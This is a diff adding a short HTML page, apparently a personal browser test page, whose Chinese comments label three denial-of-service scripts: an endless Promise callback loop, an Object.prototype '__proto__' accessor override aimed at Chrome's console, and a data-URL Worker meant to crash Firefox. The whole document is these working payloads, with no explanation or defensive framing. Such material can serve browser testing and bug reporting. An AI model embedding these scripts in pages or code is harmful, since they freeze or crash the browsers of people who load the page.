@@ -1,0 +1,21 @@
+<title>http://quininer.github.io/tests/alert.html</title>
+<!-- Promise 死循环 DoS -->
+<script>
+    (function callee(){
+        Promise.resolve().then(callee);
+    })();
+</script>
+
+<!-- Chrome Console __proto__ DoS -->
+<script>
+    Object.defineProperty(Object.prototype,"__proto__",{
+        set:console.log.bind(console,[]),
+        get:console.log.bind(console,[])
+    });
+    console.log([1,2,3]);
+</script>
+
+<!-- Firefox Worker 崩溃 DoS -->
+<script>
+    new Worker('data:text/javascript,new WeakMap().set(self);');
+</script>
